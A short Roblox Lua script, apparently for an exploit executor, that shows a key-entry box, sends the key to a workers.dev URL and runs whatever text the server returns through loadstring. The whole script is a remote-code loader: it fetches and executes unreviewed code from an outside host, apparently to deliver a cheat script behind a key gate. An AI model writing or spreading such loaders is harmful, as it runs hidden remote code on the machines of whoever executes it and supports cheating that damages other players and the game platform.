local Players = game:GetService("Players")
local player = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "SweetsitaKey"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local box = Instance.new("TextBox")
box.Size = UDim2.new(0, 300, 0, 50)
box.Position = UDim2.new(0.5, -150, 0.5, -25)
box.PlaceholderText = "Enter key..."
box.Text = ""
box.Parent = gui

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 300, 0, 45)
button.Position = UDim2.new(0.5, -150, 0.5, 35)
button.Text = "Verify"
button.Parent = gui

button.MouseButton1Click:Connect(function()
    local key = box.Text

    if key == "" then
        button.Text = "Enter a key"
        return
    end

    local url = "https://restless-meadow-feba.lucaeserojo.workers.dev/?key=" .. key
    local result = game:HttpGet(url)

    if result == "Invalid key" then
        button.Text = "Invalid key"
        return
    end

    gui:Destroy()
    loadstring(result)()
end)